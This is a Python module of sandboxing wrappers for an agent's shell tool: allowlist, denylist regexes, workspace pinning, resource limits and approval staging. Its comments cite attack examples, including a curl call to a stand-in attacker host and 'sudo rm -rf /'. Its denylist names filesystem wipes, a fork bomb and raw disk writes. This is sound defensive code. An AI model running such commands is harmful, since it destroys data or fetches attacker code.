"""
Shell tools for Pearl.

These tools provide safe wrappers around shell execution and
common operating-system commands.

Layered defenses for `execute_shell`, in the order they're applied:

1. **Allowlist** (`_check_allowlist`) — the base command of every
   `;`/`&&`/`||`/`|`-separated segment must be on the configured
   allowlist (`Settings.SHELL_ALLOWED_COMMANDS`, or a practical
   built-in default). Command substitution (`` ` ``/`$(...)`) is
   refused outright rather than decomposed, since it can hide what's
   actually about to run. This is the primary gate: deny-by-default
   for anything not recognized as an ordinary dev-workflow command.
2. **Denylist** (`_check_command_safety`) — even an allowed base
   command can be invoked destructively (`rm` is legitimate; `rm -rf
   /` is not), so a small, high-confidence pattern list still blocks
   unambiguous disasters within otherwise-allowed commands.
3. **Workspace confinement** (`_workspace_cwd`) — the command's
   starting directory is pinned to the workspace root.
4. **Resource limits** — CPU-time and memory ceilings, applied via
   POSIX `resource.setrlimit` in a `preexec_fn` (a no-op where the
   `resource` module isn't available, e.g. Windows).
5. **Approval** (`command_approval.CommandApprovalManager`) — when an
   approver is active (an `AutonomousExecutor` run in progress), the
   command is staged instead of run immediately, exactly like the
   patch-preview flow for file edits; it only actually runs once
   explicitly approved. Off by default, so direct calls (CLI, tests,
   `tools/call` outside an autonomous run) behave exactly as before.

Steps 1-4 always apply, regardless of approval mode — an unapproved
run is not allowed to skip them, and neither is a directly-called one.

The actual `subprocess.run` invocation is isolated in
`_run_shell_command`/`_run_python_script`, which is what the
`CommandApprovalManager` (or any future replacement — a container or
seccomp sandbox, say) calls to actually execute an approved request;
nothing above that point needs to change to swap it in.
"""

from __future__ import annotations

import contextvars
import logging
import re
import shutil
import subprocess
from pathlib import Path
from typing import Callable

from src.config.settings import Settings
from src.tools.command_approval import CommandApprovalManager, ShellCommandRequest
from src.tools.file_tools import _ensure_within_workspace
from src.tools.metadata import tool

try:
    import resource
except ImportError:  # Windows has no `resource` module.
    resource = None  # type: ignore[assignment]

logger = logging.getLogger(__name__)

DEFAULT_TIMEOUT = Settings.SHELL_DEFAULT_TIMEOUT

# Hard ceiling on `timeout`, regardless of what a caller (or a planned
# tool call) requests — prevents an unbounded/very large timeout from
# tying up execution indefinitely.
MAX_TIMEOUT = Settings.SHELL_MAX_TIMEOUT

# A practical, "ordinary developer workflow" default allowlist, used
# whenever `Settings.SHELL_ALLOWED_COMMANDS` is unset. Covers what
# Pearl's own tools recommend (e.g. `git_tools`'s documented
# `execute_shell("git add ...")` staging step) plus the common POSIX/
# dev-tool commands a coding agent legitimately needs. Anything not
# on this list is refused by `_check_allowlist` before it ever runs —
# deny-by-default, not block-by-exception.
DEFAULT_ALLOWED_COMMANDS = frozenset(
    {
        # Core POSIX utilities
        "ls",
        "cat",
        "echo",
        "printf",
        "pwd",
        "cd",
        "whoami",
        "uname",
        "id",
        "hostname",
        "env",
        "printenv",
        "date",
        "sleep",
        "true",
        "false",
        "test",
        "which",
        "xargs",
        "tee",
        "find",
        "grep",
        "sed",
        "awk",
        "wc",
        "sort",
        "uniq",
        "head",
        "tail",
        "diff",
        "cut",
        "tr",
        "basename",
        "dirname",
        "realpath",
        "readlink",
        "du",
        "df",
        "file",
        "stat",
        "mkdir",
        "touch",
        "cp",
        "mv",
        "rm",
        "rmdir",
        "chmod",
        "ln",
        "tar",
        "unzip",
        "zip",
        "gzip",
        "gunzip",
        # Version control
        "git",
        # Language toolchains / package managers / test runners
        "python3",
        "python",
        "pip",
        "pip3",
        "pytest",
        "ruff",
        "mypy",
        "black",
        "flake8",
        "pyflakes",
        "node",
        "npm",
        "npx",
        "yarn",
        "pnpm",
        "tsc",
        "go",
        "cargo",
        "rustc",
        "java",
        "javac",
        "mvn",
        "gradle",
        "make",
        "cmake",
        # Network fetch (legitimate for installing dependencies; see
        # the module docstring's note on residual risk)
        "curl",
        "wget",
    }
)

# Splits a command into its `;`/`&&`/`||`/`|`-separated segments, so
# each segment's base command can be allowlist-checked individually —
# an allowlist that only inspected the first token would let
# "echo hi && sudo rm -rf /" through on "echo" alone.
_CHAIN_SPLIT_RE = re.compile(r"&&|\|\||[;|]")

# Command substitution can hide what's actually about to run behind
# an allowed-looking command (e.g. "echo $(curl attacker.example)"),
# so it's refused outright rather than decomposed and checked.
_SUBSTITUTION_RE = re.compile(r"`|\$\(")

# Automatic guard against unambiguous, catastrophic shell operations —
# not a sandbox, and not a substitute for reviewing what an autonomous
# run plans to do. Each pattern below has no legitimate use in a
# coding-agent workflow (wiping the filesystem/home directory, fork
# bombs, raw disk writes, wide-open root permissions, privilege
# escalation, or shutting the machine down), so blocking them costs
# nothing for real workflows while closing off the single most
# damaging class of command an otherwise-allowed `execute_shell` call
# could issue with no review.
_DANGEROUS_PATTERNS = [
    re.compile(
        r"rm\s+(-\w*[rf]\w*\s+)+(-\w*[rf]\w*\s*)*"
        r"(/\*?|~/?\*?|\$HOME/?\*?)(\s|$)"
    ),
    re.compile(r"rm\s+--no-preserve-root"),
    re.compile(r":\(\)\s*\{[^}]*:\|:.*\}\s*;\s*:"),  # classic fork bomb
    re.compile(r"\bmkfs(\.\w+)?\b"),
    re.compile(r"\bdd\b[^\n]*\bof=/dev/"),
    re.compile(r">\s*/dev/(sd|nvme|hd)\w*"),
    re.compile(r"\bchmod\s+(-R\s+)?[0-7]{3,4}\s+/(\s|$)"),
    re.compile(r"\bchmod\s+-R\s+.*\s+/(\s|$)"),
    re.compile(r"\b(sudo|doas)\b"),
    re.compile(r"\b(shutdown|reboot|poweroff|halt)\b"),
]


class UnsafeCommandError(PermissionError):
    """
    Raised when a shell command isn't on the allowlist, or matches a
    known-catastrophic denylist pattern (filesystem wipe, fork bomb,
    raw disk write, privilege escalation, ...), and is refused before
    ever reaching the shell.
    """


def _get_allowed_commands() -> frozenset[str] | None:
    """
    Return the currently configured allowlist, or `None` if
    allowlisting is disabled (`Settings.SHELL_ALLOWED_COMMANDS ==
    "*"`).
    """

    configured = Settings.SHELL_ALLOWED_COMMANDS.strip()

    if configured == "*":
        return None

    if configured:
        return frozenset(item.strip() for item in configured.split(",") if item.strip())

    return DEFAULT_ALLOWED_COMMANDS


def _base_command(segment: str) -> str:
    tokens = segment.split()

    if not tokens:
        return ""

    # A leading `VAR=value` env-var assignment prefix doesn't name
    # the command being run — skip past any of those to the first
    # real token, same as a shell would.
    for token in tokens:
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", token):
            continue
        return Path(token).name

    return ""


def _check_allowlist(command: str) -> None:
    """
    Refuse `command` if any of its `;`/`&&`/`||`/`|`-separated
    segments invokes a base command that isn't on the configured
    allowlist, or if it contains command substitution.
    """

    allowed = _get_allowed_commands()

    if allowed is None:
        return

    if _SUBSTITUTION_RE.search(command):
        raise UnsafeCommandError(
            f"Refusing to run a command containing command substitution "
            f"(`` ` `` / `$(...)`), which can hide what actually runs: "
            f"{command!r}"
        )

    for segment in _CHAIN_SPLIT_RE.split(command):
        base = _base_command(segment)

        if base and base not in allowed:
            raise UnsafeCommandError(
                f"'{base}' is not in the allowed command list. Allowed: "
                f"{', '.join(sorted(allowed))}"
            )


def _check_command_safety(command: str) -> None:
    """
    Refuse `command` if it matches a known-catastrophic pattern.

    This is a narrow, high-confidence denylist, not a general sandbox
    — it exists to stop unambiguous disasters (wiping `/`, a fork
    bomb, raw disk writes, `sudo`) committed via an otherwise-allowed
    command (e.g. `rm`), not to police ordinary developer commands, so
    it should never trip on a legitimate workflow.
    """

    for pattern in _DANGEROUS_PATTERNS:
        if pattern.search(command):
            raise UnsafeCommandError(
                f"Refusing to run a command matching a known-dangerous "
                f"pattern ({pattern.pattern!r}): {command!r}"
            )


def _workspace_cwd() -> str:
    """
    Return the current workspace root, resolved the same way file
    tools resolve theirs, so shell commands run pinned to it rather
    than to whatever cwd the process happens to have at call time.

    Note: this does not prevent a command from using `cd` or absolute
    paths to act outside the workspace — the shell itself has no such
    boundary. It confines the *starting* directory, which is the only
    workspace guarantee a `shell=True` command can be given without a
    real sandbox (containers/seccomp) — see the module docstring;
    that's future work this design deliberately leaves room for.
    """

    return str(Path.cwd().resolve())


def _resource_limiter(
    cpu_seconds: int | None,
    memory_mb: int | None,
) -> Callable[[], None] | None:
    """
    Return a `preexec_fn` for `subprocess.run` that caps the child
    process's CPU time and/or address space (an approximation of
    memory usage) before it execs, or `None` if no limits were
    requested or the current platform has no `resource` module (e.g.
    Windows) — resource limiting is applied "where supported", never
    required, so it degrades to a no-op rather than failing the call.
    """

    if resource is None or (cpu_seconds is None and memory_mb is None):
        return None

    def _apply_limits() -> None:
        if cpu_seconds is not None:
            resource.setrlimit(resource.RLIMIT_CPU, (cpu_seconds, cpu_seconds))

        if memory_mb is not None:
            limit_bytes = memory_mb * 1024 * 1024
            resource.setrlimit(resource.RLIMIT_AS, (limit_bytes, limit_bytes))

    return _apply_limits


def _resolved_limits(
    cpu_seconds: int | None, memory_mb: int | None
) -> tuple[int | None, int | None]:
    """
    Fill in `Settings`-configured defaults for any limit the caller
    didn't specify explicitly.
    """

    if cpu_seconds is None:
        cpu_seconds = Settings.SHELL_DEFAULT_CPU_SECONDS

    if memory_mb is None:
        memory_mb = Settings.SHELL_DEFAULT_MEMORY_MB

    return cpu_seconds, memory_mb


# When set, `execute_shell` stages its command in the active
# `CommandApprovalManager` instead of running it immediately
# ("preview mode" for shell commands — mirrors `edit_tools`'s
# `_active_patch_manager` exactly). Unset (the default), it runs
# directly, exactly as before this module gained approval support —
# so direct calls (CLI, tests, `tools/call` outside an autonomous
# run) are completely unaffected. Only `AutonomousExecutor` activates
# it, for the duration of its own run.
_active_command_approver: contextvars.ContextVar[CommandApprovalManager | None] = (
    contextvars.ContextVar("pearl_active_command_approver", default=None)
)


def set_active_command_approver(manager: CommandApprovalManager | None) -> None:
    """
    Activate (or, with `None`, deactivate) approval-required mode for
    `execute_shell`.
    """

    _active_command_approver.set(manager)


def get_active_command_approver() -> CommandApprovalManager | None:
    """
    Return the currently active `CommandApprovalManager`, or `None`
    if approval mode is off (the default).
    """

    return _active_command_approver.get()


def _run_shell_command(request: ShellCommandRequest) -> subprocess.CompletedProcess:
    """
    Actually run an approved (or directly-called, non-preview)
    `ShellCommandRequest` via `subprocess.run`.

    This is the one place `shell=True` execution happens — the sole
    seam a future container/sandbox-based runner would replace.
    """

    logger.info("Executing command: %s", request.command)

    return subprocess.run(
        request.command,
        shell=True,
        text=True,
        capture_output=True,
        timeout=request.timeout,
        check=True,
        cwd=request.cwd,
        preexec_fn=_resource_limiter(request.cpu_seconds, request.memory_mb),
    )


def _run_fixed_command(command: str) -> str:
    """
    Run a fixed, hardcoded command directly (workspace-pinned,
    resource-limited per `Settings`, but bypassing the allowlist,
    denylist, and approval-staging that apply to arbitrary,
    LLM-composed `execute_shell` calls) and return its stripped
    stdout.
    """

    cpu_seconds, memory_mb = _resolved_limits(None, None)
    request = ShellCommandRequest(
        command=command,
        cwd=_workspace_cwd(),
        timeout=DEFAULT_TIMEOUT,
        cpu_seconds=cpu_seconds,
        memory_mb=memory_mb,
    )

    return _run_shell_command(request).stdout.strip()


@tool(
    description="Execute a shell command.",
    parameters={
        "command": "str",
        "timeout": "int",
        "cpu_seconds": "int",
        "memory_mb": "int",
    },
    returns="subprocess.CompletedProcess | str",
)
def execute_shell(
    command: str,
    timeout: int = DEFAULT_TIMEOUT,
    cpu_seconds: int | None = None,
    memory_mb: int | None = None,
) -> subprocess.CompletedProcess | str:
    """
    Execute a shell command, pinned to the workspace root.

    In preview mode (an `AutonomousExecutor` run in progress), stages
    the command in the active `CommandApprovalManager` and returns a
    short status string instead of running anything — the command
    only actually runs once explicitly approved.

    Raises
    ------
    UnsafeCommandError
        If `command` isn't on the configured allowlist, contains
        command substitution, or matches a known-catastrophic denylist
        pattern (see `_check_allowlist`/`_check_command_safety`) —
        never reaches the shell either way.
    subprocess.CalledProcessError
        If the command exits with a non-zero status (direct mode
        only — a staged command's exit status isn't known until it's
        approved and actually run).
    """

    _check_allowlist(command)
    _check_command_safety(command)

    timeout = min(timeout, MAX_TIMEOUT)
    cpu_seconds, memory_mb = _resolved_limits(cpu_seconds, memory_mb)

    request = ShellCommandRequest(
        command=command,
        cwd=_workspace_cwd(),
        timeout=timeout,
        cpu_seconds=cpu_seconds,
        memory_mb=memory_mb,
    )

    approver = get_active_command_approver()

    if approver is not None:
        logger.info("Staging command for approval: %s", command)

        approver.propose(request)

        return f"Command staged for approval: {command!r}"

    return _run_shell_command(request)


def _run_python_script(
    script: str,
    cwd: str,
    timeout: int,
    cpu_seconds: int | None,
    memory_mb: int | None,
) -> subprocess.CompletedProcess:
    logger.info("Executing python script: %s", script)

    return subprocess.run(
        ["python3", script],
        shell=False,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=True,
        cwd=cwd,
        preexec_fn=_resource_limiter(cpu_seconds, memory_mb),
    )


@tool(
    description="Execute a Python script.",
    parameters={
        "script": "str",
        "timeout": "int",
        "cpu_seconds": "int",
        "memory_mb": "int",
    },
    returns="subprocess.CompletedProcess",
)
def run_python(
    script: str,
    timeout: int = DEFAULT_TIMEOUT,
    cpu_seconds: int | None = None,
    memory_mb: int | None = None,
) -> subprocess.CompletedProcess:
    """
    Execute a Python script, pinned to the workspace root.

    Raises
    ------
    subprocess.CalledProcessError
        If the script exits with a non-zero status.
    """

    timeout = min(timeout, MAX_TIMEOUT)
    cpu_seconds, memory_mb = _resolved_limits(cpu_seconds, memory_mb)

    return _run_python_script(script, _workspace_cwd(), timeout, cpu_seconds, memory_mb)


@tool(
    description="Return the current working directory.",
    returns="str",
)
def pwd() -> str:
    """
    Return current working directory.
    """

    return str(Path.cwd())


@tool(
    description="List files in the current or specified directory.",
    parameters={
        "path": "str",
        "show_hidden": "bool",
    },
    returns="list[str]",
)
def ls(
    path: str = ".",
    show_hidden: bool = False,
) -> list[str]:
    """
    List directory contents.
    """

    directory = _ensure_within_workspace(path)

    if not directory.exists():
        raise FileNotFoundError(path)

    if not directory.is_dir():
        raise NotADirectoryError(path)

    items = []

    for item in sorted(directory.iterdir()):
        if not show_hidden and item.name.startswith("."):
            continue

        items.append(item.name)

    return items


@tool(
    description="Locate a command on the current system.",
    parameters={
        "command": "str",
    },
    returns="str | None",
)
def which(command: str) -> str | None:
    """
    Locate a system executable.
    """

    return shutil.which(command)


@tool(
    description="Return whether a command exists on the system.",
    parameters={
        "command": "str",
    },
    returns="bool",
)
def is_command_available(command: str) -> bool:
    """
    Check if a command is available.
    """

    return which(command) is not None


@tool(
    description="Return the operating system name.",
    returns="str",
)
def operating_system() -> str:
    """
    Return operating system.

    Runs directly rather than through `execute_shell`: this is a
    fixed, hardcoded, always-safe introspection command, not an
    LLM-composed one, so it isn't subject to allowlisting or
    approval staging — which also means it keeps working (returning
    a real string, not a "staged for approval" placeholder) during
    an `AutonomousExecutor` run.
    """

    return _run_fixed_command("uname -a")


@tool(
    description="Return the current username.",
    returns="str",
)
def current_user() -> str:
    """
    Return current user.

    Runs directly rather than through `execute_shell` — see
    `operating_system`'s docstring for why.
    """

    return _run_fixed_command("whoami")
